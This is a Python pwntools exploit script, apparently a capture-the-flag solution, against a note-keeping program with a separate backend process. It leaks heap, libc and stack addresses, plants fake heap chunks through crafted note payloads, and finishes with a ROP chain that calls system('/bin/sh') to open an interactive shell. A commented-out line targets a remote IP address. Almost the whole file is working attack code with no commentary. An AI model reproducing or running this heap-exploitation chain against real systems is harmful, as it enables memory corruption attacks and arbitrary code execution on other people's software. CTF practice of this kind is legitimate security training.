from pwn import *
import psutil

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)


interface = context.binary = ELF('interface')
libc = ELF('libc.so.6')


def pidof(name):
    pid = 0
    for proc in psutil.process_iter():
        if name == proc.name():
            pid = proc.pid
            break
    return pid

def choice(i):
    sla(b'Choice: ', str(i).encode())
def new_note(title, author, content_len, content, encrypt = None):
    choice(1)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'notes?', b'y')
        sla(b'passwd? ', encrypt)
    else:
        sla(b'notes?', b'n')
    sla(b'content?', str(content_len).encode())
    sa(b'Content: ', content)
    p.sendline(b'')
def list_note():
    choice(2)
def read_note(title, author, encrypt = None):
    choice(3)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'Password', encrypt)
def edit_note(title, author, content_len, content, encrypt = None):
    choice(4)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'Password', encrypt)
    sla(b'len', str(content_len).encode())
    sla(b'content', content)
def delete_note(title, author, encrypt = None):
    choice(5)
    sla(b'Title', title)
    sla(b'Author', author)
    if encrypt != None:
        sla(b'password', encrypt)
def note_sync(s_c):
    choice(6)
    if s_c == 'c':
        sla(b'note? ', b'c')
    else:
        sla(b'note? ', b's')
    
    
    
    
def GDB(proc):
    gdb.attach(proc, gdbscript='''
               #b delete_note
               b *(note_sync + 547)
               #b *(add_new_note + 316)
               #b edit_note
               c''')
def GDB_backend(proc):
    gdb.attach(proc, gdbscript='''
               #b NoteBackend_init
               c''')
def GDB_All():
    GDB(p)
    #GDB_backend(pidof('backend'))

# = remote('0', 31339)
#p = remote('139.162.29.93', 31339)    
p = process(['./interface', './backend'])
#print('pidof: ', pidof('backend'))
new_note(b'a', b'a', 1, b'a')
#p.sendline(b'')

#leak heap
edit_note(b'a', b'a', 1, b'a')
list_note()
p.recvuntil(b'Content: ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
heap = leak << 4*3
print('heap: ', hex(heap))

#leak libc
edit_note(b'a', b'a', 0x500, b'a')
new_note(b'b', b'b', 1, b'b')
#p.sendline(b'')
edit_note(b'a', b'a', 1, b'a')
list_note()
p.recvuntil(b'Content: ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - 0x21b110
print('libc: ', hex(libc.address))

delete_note(b'a', b'a')
delete_note(b'b', b'b')


payload = b'A'*0x10
payload += p64(0) + p64(0x91)
payload += p64(0x62) + p64(0)*7
payload += p64(0x62) + p64(0)*3
payload += p64(0x10) + p64(0) + p64(libc.symbols['environ']) + p64(heap + 0x370)
payload += p64(0) + p64(0x21)
payload += p64(libc.address + 0x21ace0)*2
payload += p64(0) + p64(0x91)
payload += p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x200) + p64(0)*4 + p64(0xf1)
payload += p64(libc.address + 0x21ace0)*2
payload = payload.ljust(0x200, b'\x00')
new_note(b'a', b'a', 0x200, payload)
note_sync('c')
edit_note(b'a', b'a', 1, b'a')
new_note(b'b', b'b', 1, b'hehe')

note_sync('s')
list_note()
p.recvuntil(b'Author: b\n')
p.recvuntil(b'Content: ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
stack = leak
print('stack: ', hex(stack))
#new_note(b'a', b'a', 1, b'a')
#delete_note(b'a', b'a')

#

payload = b'\x00'*0x200
payload += p64(0) + p64(0x21) + b'A'*0x10 + p64(0) + p64(0x91)
payload += p64(0x62) + p64(0)*7 + p64(0x62) + p64(0)*3 + p64(0x10) + p64(0)
payload += p64(stack)
payload += p64(heap + 0x630) + p64(0) + p64(0x21)
payload += p64(libc.address + 0x21ace0)*2
payload += p64(0) + p64(0x91)
payload += p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x200) + p64(0) + p64(heap + 0x400)  + p64(heap + 0x770)*2 + p64(0x91)
payload += p64(0x62) + p64(0)*7
payload += p64(0x62) + p64(0)*3
payload += p64(0x50) + p64(0x2)
payload += p64(stack - 0x338) + p64(heap + 0x6e0) + p64(0) + p64(0x61)
payload += p64(0xdeadbeef)
print('len: ', hex(len(payload)))

payload2 = b'hihi'
RET = 0x00000000000baaf9 + libc.address#: xor rax, rax ; ret

rop = ROP(libc)
rop.raw(RET)
rop.system(next(libc.search(b'/bin/sh\x00')))
payload2 = rop.chain()
delete_note(b'a', b'a')
delete_note(b'b', b'b')
new_note(b'a', b'a', 0x400, payload)
new_note(b'b', b'b', 0x50, payload2)
note_sync('c')
edit_note(b'a', b'a', 0x200, b'a')
GDB_All()
note_sync('s')

p.interactive()

